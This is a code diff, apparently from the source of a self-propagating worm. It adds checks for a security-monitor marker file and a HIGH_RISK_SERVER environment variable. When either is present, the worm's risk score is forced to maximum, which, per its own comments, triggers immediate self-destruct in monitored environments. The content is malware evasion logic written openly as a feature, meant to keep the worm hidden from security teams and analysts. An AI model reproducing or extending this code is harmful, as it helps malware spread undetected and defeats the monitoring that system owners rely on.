@@ -18,7 +18,21 @@ static int collect_network_signals(void) {
 }
 
 // System signal collection
+// Checks for indicators of monitored/high-security environments
 static int collect_system_signals(void) {
+    // Check for high-risk server marker file
+    // This file indicates the server is in a monitored/security environment
+    if (access("/etc/.security-monitor", F_OK) == 0) {
+        // High-risk server detected - return maximum system risk
+        return 10;
+    }
+    
+    // Check for HIGH_RISK_SERVER environment variable
+    if (getenv("HIGH_RISK_SERVER") != NULL) {
+        // High-risk server detected via environment variable
+        return 10;
+    }
+    
     return 0;
 }
 
@@ -62,7 +76,8 @@ static int calculate_behavioral_risk(int beh_signal) {
 // 1. Collect signals: network (failed connections), system (resource usage), behavioral (failure rate)
 // 2. Calculate individual risk scores (0-10) for each category
 // 3. Weighted combination: Network 40%, System 30%, Behavioral 30%
-// 4. Clamp to 0-10 range
+// 4. If high-risk server detected (monitored environment), force total_risk to 10 (immediate self-destruct)
+// 5. Clamp to 0-10 range
 //
 // Risk thresholds (used by main loop):
 // - total_risk < 4:  Normal mode (proceed with operations)
@@ -80,6 +95,13 @@ risk_assessment_t assess_risk(void) {
     risk.network_risk = calculate_network_risk(net_signal);
     risk.system_risk = calculate_system_risk(sys_signal);
     risk.behavioral_risk = calculate_behavioral_risk(beh_signal);
+    
+    // If high-risk server detected (system_risk = 10), force immediate self-destruct
+    // This overrides weighted calculation to ensure worm self-destructs in monitored environments
+    if (risk.system_risk >= 10) {
+        risk.total_risk = 10;  // Maximum risk - triggers immediate self-destruct
+        return risk;
+    }
     
     // Weighted total: Network weighted highest (most reliable detection signal)
     risk.total_risk = (int)(
